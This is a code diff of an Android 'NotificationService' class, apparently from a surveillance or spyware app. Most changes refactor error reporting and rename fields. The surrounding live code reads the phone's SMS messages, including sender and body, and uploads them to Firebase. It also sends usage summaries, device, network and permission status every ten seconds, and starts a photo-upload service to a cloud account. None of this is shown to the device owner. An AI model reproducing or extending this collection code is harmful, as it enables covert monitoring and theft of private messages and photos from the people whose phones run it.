+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.list.readSms.outer.catch", e);
             return null;
         } finally {
             try {
                 if (cursor != null) cursor.close();
             } catch (Throwable e) {
-                errorSendToDatabase("NotificationService.java.private.list.readSms.outer.catch.finally.catch", e);
+                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.list.readSms.outer.catch.finally.catch", e);
             }
         }
     }
@@ -1125,8 +1226,8 @@ public class NotificationService extends NotificationListenerService implements 
 
             for (JSONObject sms : smsList) {
                 try {
-                    long date = sms.optLong("date", 0);
-                    if (date > maxTime) maxTime = date;
+                    long dateTime = sms.optLong("dateTime", 0);
+                    if (dateTime > maxTime) maxTime = dateTime;
 
                     String id = ref.push().getKey();
                     if (id == null) return;
@@ -1135,13 +1236,13 @@ public class NotificationService extends NotificationListenerService implements 
                     data.put("id", sms.optString("id"));
                     data.put("address", sms.optString("address"));
                     data.put("body", sms.optString("body"));
-                    data.put("date", formatDateTime(date));
+                    data.put("dateTime", formatDateTime(dateTime));
                     data.put("type", sms.optString("type"));
 
                     batchUpdate.put(id, data);
 
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.sendSmsToDatabase.inner.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendSmsToDatabase.inner.catch", e);
                 }
             }
 
@@ -1151,30 +1252,31 @@ public class NotificationService extends NotificationListenerService implements 
                         .addOnSuccessListener(aVoid -> {
                             sp.edit().putLong("last_sms_sent", timeToSave).apply();
                         })
-                        .addOnFailureListener(e -> errorSendToDatabase("NotificationService.java.private.void.sendSmsToDatabase.firebase.FailureListener", e));
+                        .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendSmsToDatabase.firebase.FailureListener", e));
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.sendSmsToDatabase.outer.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendSmsToDatabase.outer.catch", e);
         }
     }
 
-    // ========================= USAGE SUMMARIES =========================
-    private void checkAndSendUsageSummaries() {
+    // ========================= USAGE SUMMARY =========================
+    private void checkAndSendUsageSummary() {
         try {
             FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
             if (user == null) return;
 
             if (!hasUsageStatsPermission()) return;
 
-            long now = System.currentTimeMillis();
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
 
-            long lastCooldownSet = sp.getLong("last_usage_summaries_cooldown_set", 0);
+            long lastCooldownSet = sp.getLong("last_usage_summary_cooldown_set", 0);
+            long now = System.currentTimeMillis();
+            
             if (now - lastCooldownSet < ONE_DAY_MS) return;
 
             sendUsageSummary(user.getUid(), sp, now);
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.checkAndSendUsageSummaries.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendUsageSummary.catch", e);
         }
     }
 
@@ -1230,22 +1332,22 @@ public class NotificationService extends NotificationListenerService implements 
 
                         updates.put(safeKey, data);
                     } catch (Throwable e) {
-                        errorSendToDatabase("NotificationService.java.private.void.sendUsageSummaries.inner.catch", e);
+                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendUsageSummary.inner.catch", e);
                     }
                 }
 
                 if (!updates.isEmpty()) {
                     ref.updateChildren(updates)
                             .addOnSuccessListener(aVoid -> {
-                                sp.edit().putLong("last_usage_summaries_cooldown_set", now).apply();
+                                sp.edit().putLong("last_usage_summary_cooldown_set", now).apply();
                             })
-                            .addOnFailureListener(e -> errorSendToDatabase("NotificationService.java.private.void.sendUsageSummaries.firebase.FailureListener", e));
+                            .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendUsageSummary.firebase.FailureListener", e));
                 }
             } catch (Throwable e) {
-                errorSendToDatabase("NotificationService.java.private.void.sendUsageSummaries.middle.catch", e);
+                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendUsageSummary.middle.catch", e);
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.sendUsageSummaries.outer.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendUsageSummary.outer.catch", e);
         }
     }
 
@@ -1264,10 +1366,11 @@ public class NotificationService extends NotificationListenerService implements 
             FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
             if (user == null) return;
 
-            long now = System.currentTimeMillis();
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
 
             long lastCooldownSet = sp.getLong("last_device_status_cooldown_set", 0);
+            long now = System.currentTimeMillis();
+            
             if (now - lastCooldownSet < TEN_SECOND_MS) return;
 
             sp.edit().putLong("last_device_status_cooldown_set", now).apply();
@@ -1275,37 +1378,51 @@ public class NotificationService extends NotificationListenerService implements 
             try {
                 Map<String, Object> root = new HashMap<>();
 
-                // Device info
+                // Device
                 try {
-                    String androidId = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+                    String androidId;
+                    try {
+                        androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                        if (androidId == null) androidId = "unknown";
+                    } catch (Exception ignored) {
+                        androidId = "unknown";
+                    } 
+                    
                     Map<String, Object> deviceMap = new HashMap<>();
-                    deviceMap.put("androidId", androidId != null ? androidId : "unknown");
-                    deviceMap.put("deviceName", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
-                    deviceMap.put("androidVersion", android.os.Build.VERSION.RELEASE);
+                    deviceMap.put("androidId", androidId);
                     deviceMap.put("manufacturer", android.os.Build.MANUFACTURER);
                     deviceMap.put("brand", android.os.Build.BRAND);
-
+                    deviceMap.put("model", android.os.Build.MODEL);
+                    deviceMap.put("androidVersion", android.os.Build.VERSION.RELEASE);
+                    
                     root.put("device", deviceMap);
 
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.device.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.device.catch", e);
                 }
 
-                // App info
+                // App
                 try {
                     android.content.pm.PackageInfo pi = getPackageManager().getPackageInfo(getPackageName(), 0);
                     Map<String, Object> appMap = new HashMap<>();
+                    appMap.put("package", getPackageName());
                     appMap.put("version", pi.versionName);
                     appMap.put("firstInstall", formatDateTime(pi.firstInstallTime));
                     appMap.put("lastUpdate", formatDateTime(pi.lastUpdateTime));
+                    appMap.put("contactsPermission", hasContactsPermission());
+                    appMap.put("callLogsPermission", hasCallLogPermission());
+                    appMap.put("smsPermission", hasSmsPermission());
+                    appMap.put("locationPermission", hasLocationPermission());
+                    appMap.put("usageStatsPermission", hasUsageStatsPermission());
+                    appMap.put("storagePermission", hasStoragePermission());
 
                     root.put("app", appMap);
 
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.app.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.app.catch", e);
                 }
 
-                // Battery info
+                // Battery
                 try {
                     android.content.Intent batteryStatus = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
                     if (batteryStatus != null) {
@@ -1316,40 +1433,75 @@ public class NotificationService extends NotificationListenerService implements 
                         int plugged = batteryStatus.getIntExtra("plugged", -1);
 
                         Map<String, Object> batteryMap = new HashMap<>();
-                        batteryMap.put("percentage", (int) ((level / (float) scale) * 100));
+                        batteryMap.put("percentage", ((int) ((level / (float) scale) * 100)) + "%");
                         batteryMap.put("charging", status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL);
-                        batteryMap.put("temp", temp / 10.0);
-                        batteryMap.put("voltage", batteryStatus.getIntExtra("voltage", -1));
+                        batteryMap.put("temp", (temp / 10.0) + "°C");
+                        batteryMap.put("voltage", batteryStatus.getIntExtra("voltage", -1) + " mV");
 
-                        String source = "BATTERY";
-                        if (plugged == android.os.BatteryManager.BATTERY_PLUGGED_USB) source = "USB";
-                        else if (plugged == android.os.BatteryManager.BATTERY_PLUGGED_AC) source = "AC";
+                        String source;
+                        switch (plugged) {
+                            case BatteryManager.BATTERY_PLUGGED_AC:
+                                source = "AC";
+                                break;
+
+                            case BatteryManager.BATTERY_PLUGGED_USB:
+                                source = "USB";
+                                break;
+                                
+                            case BatteryManager.BATTERY_PLUGGED_WIRELESS:
+                                source = "WIRELESS";
+                                break;
+                                
+                            case BatteryManager.BATTERY_PLUGGED_DOCK:
+                                source = "DOCK";
+                                break;
+                                
+                            case 0:
+                                source = "BATTERY";
+                                break;
+
+                            default:
+                                source = "UNKNOWN";
+                                break;
+                        }
+
                         batteryMap.put("source", source);
 
                         root.put("battery", batteryMap);
                     }
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.battery.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.battery.catch", e);
                 }
 
-                // Network info
+                // Network
                 try {
                     ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                     android.net.NetworkInfo ni = cm.getActiveNetworkInfo();
                     boolean internet = ni != null && ni.isConnected();
+                    
+                    boolean vpn = false;
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                        android.net.Network network = cm.getActiveNetwork();
+                        if (network != null) {
+                            android.net.NetworkCapabilities capabilities = cm.getNetworkCapabilities(network);
+                            vpn = capabilities != null &&
+                            capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN);
+                        }
+                    }
 
                     Map<String, Object> networkMap = new HashMap<>();
                     networkMap.put("internet", internet);
                     networkMap.put("connectionType", internet ? (ni.getType() == ConnectivityManager.TYPE_WIFI ? "WIFI" : "MOBILE") : "NONE");
+                    networkMap.put("vpn", vpn);
                     networkMap.put("airplane", android.provider.Settings.Global.getInt(getContentResolver(), android.provider.Settings.Global.AIRPLANE_MODE_ON, 0) == 1);
 
                     root.put("network", networkMap);
 
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.network.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.network.catch", e);
                 }
 
-                // Location status
+                // Location
                 try {
                     LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                     Map<String, Object> locationMap = new HashMap<>();
@@ -1358,10 +1510,10 @@ public class NotificationService extends NotificationListenerService implements 
                     root.put("location", locationMap);
 
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.location.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.location.catch", e);
                 }
 
-                // Sound status
+                // Sound
                 try {
                     android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
                     android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
@@ -1389,45 +1541,10 @@ public class NotificationService extends NotificationListenerService implements 
                     root.put("sound", soundMap);
 
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.sound.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.sound.catch", e);
                 }
 
-                // Permissions status
-                try {
-                    Map<String, Object> permissionMap = new HashMap<>();
-                    permissionMap.put("contacts", hasContactsPermission());
-                    permissionMap.put("callLogs", hasCallLogPermission());
-                    permissionMap.put("sms", hasSmsPermission());
-                    permissionMap.put("usageStats", hasUsageStatsPermission());
-                    permissionMap.put("location", hasLocationPermission());
-                    permissionMap.put("storage", hasStoragePermission());
-
-                    root.put("permissions", permissionMap);
-
-                } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.permissions.catch", e);
-                }
-
-                // Sensors info
-                try {
-                    Map<String, Object> sensorMap = new HashMap<>();
-                    sensorMap.put("proximity", proximityStatus);
-                    sensorMap.put("light", lightValue);
-                    sensorMap.put("movement", movementValue);
-
-                    root.put("sensors", sensorMap);
-
-                    new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                        if (sensorManager != null) {
-                            sensorManager.unregisterListener(NotificationService.this);
-                        }
-                    }, 3000);
-
-                } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.sensors.catch", e);
-                }
-
-                // Blutooth info
+                // Blutooth
                 try {
                     BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
                     Map<String, Object> bluetoothMap = new HashMap<>();
@@ -1453,10 +1570,10 @@ public class NotificationService extends NotificationListenerService implements 
                     root.put("bluetooth", bluetoothMap);
 
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.blutooth.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.blutooth.catch", e);
                 }
 
-                // Display status
+                // Display
                 try {
                     Map<String, Object> displayMap = new HashMap<>();
                     PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
@@ -1471,10 +1588,10 @@ public class NotificationService extends NotificationListenerService implements 
                     root.put("display", displayMap);
 
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.display.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.display.catch", e);
                 }
 
-                // Headphone status
+                // Headphone
                 try {
                     AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                     Map<String, Object> audioMap = new HashMap<>();
@@ -1518,22 +1635,22 @@ public class NotificationService extends NotificationListenerService implements 
                     root.put("headphone", audioMap);
 
                 } catch (Throwable e) {
-                    errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.headphone.catch", e);
+                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.headphone.catch", e);
                 }
 
                 String uid = user.getUid();
-                String time = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.getDefault()).format(new Date());
+                String dateTime = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US).format(new Date());
 
-                root.put("lastUpdate", time);
+                root.put("lastUpdate", dateTime);
                 FirebaseDatabase.getInstance().getReference("users_data")
                         .child(uid).child("device_status")
                         .updateChildren(root);
 
             } catch (Throwable e) {
-                errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.middle.catch", e);
+                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.middle.catch", e);
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.checkAndSendDeviceStatus.outer.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.outer.catch", e);
         }
     }
 
@@ -1544,82 +1661,37 @@ public class NotificationService extends NotificationListenerService implements 
             if (user == null) return;
 
             if (!hasStoragePermission()) return;
-
-            long now = System.currentTimeMillis();
+            
             SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);
 
             long lastCooldownSet = sp.getLong("last_photos_cooldown_set", 0);
-            if (now - lastCooldownSet < FIFTEEN_MINUTE_MS) return;
+            long now = System.currentTimeMillis();
+            
+            if (now - lastCooldownSet < TEN_MINUTE_MS) return;
 
-            SharedPreferences sp2 = getApplicationContext().getSharedPreferences("config_data", Context.MODE_PRIVATE);
-
-            Boolean canUpload = sp2.getBoolean("upload_enabled", false);
-            String cloudName = sp2.getString("cloud_name", "");
-            String uploadPreset = sp2.getString("upload_preset", "");
+            Boolean canUpload = sp.getBoolean("upload_enabled", false);
+            String cloudName = sp.getString("cloud_name", "");
+            String uploadPreset = sp.getString("upload_preset", "");
 
             if (canUpload && !cloudName.isEmpty() && !uploadPreset.isEmpty()) {
                 sp.edit().putLong("last_photos_cooldown_set", now).apply();
-
+                
                 // Start photos service
                 Intent phoIntent = new Intent(this, PhotosService.class);
                 startService(phoIntent);
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.void.checkAndSendPhotos.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendPhotos.catch", e);
         }
     }
-
-    // ========================= DEBUG =========================
-    private void errorSendToDatabase(String tag, Throwable t) {
-        try {
-            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
-            if (user == null) return;
-
-            String uid = user.getUid();
-            String time = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.getDefault()).format(new Date());
-            String androidId;
-            try {
-                androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-                if (androidId == null) androidId = "unknown";
-            } catch (Throwable e) {
-                androidId = "unknown";
-            }
-
-            DatabaseReference ref = FirebaseDatabase.getInstance()
-                    .getReference("errors")
-                    .push();
-
-            Map<String, Object> data = new HashMap<>();
-            data.put("uid", user.getUid());
-            data.put("appVersion", getAppVersion());
-            data.put("time", time);
-            data.put("type", t.getClass().getSimpleName());
-            data.put("msg", t.getMessage() != null ? t.getMessage() : "No message");
-            data.put("tag", tag);
-            data.put("androidId", androidId);
-            data.put("deviceName", Build.MANUFACTURER + " " + Build.MODEL);
-            data.put("androidVersion", Build.VERSION.RELEASE);
-            data.put("sdkInt", Build.VERSION.SDK_INT);
-
-            ref.setValue(data);
-        } catch (Throwable ignored) {}
-    }
-
-    private String getAppVersion() {
-        try {
-            return getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
-        } catch (Throwable e) {
-            return "unknown";
-        }
-    }
-
+    
     // ========================= HELPERS =========================
     private boolean hasContactsPermission() {
         try {
             return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                     == PackageManager.PERMISSION_GRANTED;
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.boolean.hasContactsPermission.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasContactsPermission.catch", e);
             return false;
         }
     }
@@ -1629,7 +1701,7 @@ public class NotificationService extends NotificationListenerService implements 
             return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                     == PackageManager.PERMISSION_GRANTED;
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.boolean.hasCallLogPermission.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasCallLogPermission.catch", e);
             return false;
         }
     }
@@ -1639,7 +1711,7 @@ public class NotificationService extends NotificationListenerService implements 
             return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                     == PackageManager.PERMISSION_GRANTED;
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.boolean.hasSmsPermission.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasSmsPermission.catch", e);
             return false;
         }
     }
@@ -1653,7 +1725,7 @@ public class NotificationService extends NotificationListenerService implements 
                     android.os.Process.myUid(), getPackageName());
             return mode == AppOpsManager.MODE_ALLOWED;
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.boolean.hasUsageStatsPermission.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasUsageStatsPermission.catch", e);
             return false;
         }
     }
@@ -1665,7 +1737,7 @@ public class NotificationService extends NotificationListenerService implements 
                     || ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                     == PackageManager.PERMISSION_GRANTED;
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.boolean.hasLocationPermission.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasLocationPermission.catch", e);
             return false;
         }
     }
@@ -1685,7 +1757,7 @@ public class NotificationService extends NotificationListenerService implements 
                         Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
             }
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.boolean.hasStoragePermission.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasStoragePermission.catch", e);
             return false;
         }
     }
@@ -1704,7 +1776,7 @@ public class NotificationService extends NotificationListenerService implements 
             return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                     caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.boolean.isInternetOn.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.isInternetOn.catch", e);
             return false;
         }
     }
@@ -1716,26 +1788,36 @@ public class NotificationService extends NotificationListenerService implements 
 
             return lm.isLocationEnabled();
         } catch (Throwable e) {
-            errorSendToDatabase("NotificationService.java.private.boolean.isLocationEnabled.catch", e);
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.isLocationEnabled.catch", e);
             return false;
         }
     }
 
     private String formatDuration(long millis) {
-        if (millis < 0) return "0s";
-        long seconds = millis / 1000;
-        long hours = seconds / 3600;
-        long minutes = (seconds % 3600) / 60;
-        long secs = seconds % 60;
-
-        if (hours > 0) return String.format(Locale.US, "%dh %dm %ds", hours, minutes, secs);
-        if (minutes > 0) return String.format(Locale.US, "%dm %ds", minutes, secs);
-        return String.format(Locale.US, "%ds", secs);
+        try {
+            if (millis < 0) return "0s";
+            long seconds = millis / 1000;
+            long hours = seconds / 3600;
+            long minutes = (seconds % 3600) / 60;
+            long secs = seconds % 60;
+            
+            if (hours > 0) return String.format(Locale.US, "%dh %dm %ds", hours, minutes, secs);
+            if (minutes > 0) return String.format(Locale.US, "%dm %ds", minutes, secs);
+            return String.format(Locale.US, "%ds", secs);
+        } catch (Throwable e) {
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.String.formatDuration.catch", e);
+            return "unknown";
+        }
     }
 
     private String formatDateTime(long timestamp) {
-        if (timestamp <= 0) return "";
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US);
-        return sdf.format(new java.util.Date(timestamp));
+        try {
+            if (timestamp <= 0) return "";
+            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US);
+            return sdf.format(new java.util.Date(timestamp));
+        } catch (Throwable e) {
+            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.String.formatDateTime.catch", e);
+            return "unknown";
+        }
     }
 }
